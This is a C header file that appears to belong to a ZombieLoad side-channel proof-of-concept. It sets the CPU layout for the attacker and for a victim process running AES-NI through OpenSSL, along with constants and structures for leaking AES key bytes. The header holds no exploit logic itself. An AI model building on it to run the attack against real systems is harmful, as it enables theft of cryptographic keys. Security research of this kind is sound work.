#ifndef MAIN_H
#define MAIN_H

#define _GNU_SOURCE // required by sched.h

#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <poll.h>
#include <inttypes.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/time.h>

// CPU Layout:
//  +-- Physical CPU 0
//       +-- Logical CPU 0
//       |   +-- ZombieLoad
//       +-- Logical CPU 1 (or 4)
//           +-- Victim Process using AES-NI via OpenSSL (external)

// To change this layout, modify the following definitions accordingly:

#define CPU_ATTACKER 3

// Allocate the probe array on 4KB pages (0) or 2MB pages (1)?
#define USE_HUGEPAGE_PROBE_ARRAY 0

// Use the C (0) or inline assembly (1) implementation of transient fingerprinting?
#define USE_ASM_XOR 1

#define KEY_LENGTH 16
#define NUM_POSITIONS 64
#define NUM_BYTES 256
#define NUM_FINGERPRINTS 256
#define NUM_RANKING 5
#define NUM_ITERATIONS_PER_POS 500

#include "utils.h"
#include "zombieload.h"

typedef struct {
	uint8_t byte; // ZombieLoad: Leaked Byte
	uint8_t pos;  // Byte position
	uint8_t fingerprint; // Cache Line Fingerprint
} sample;

typedef struct {
	uint8_t byte;
	unsigned int count;
} hist_elem;

#endif
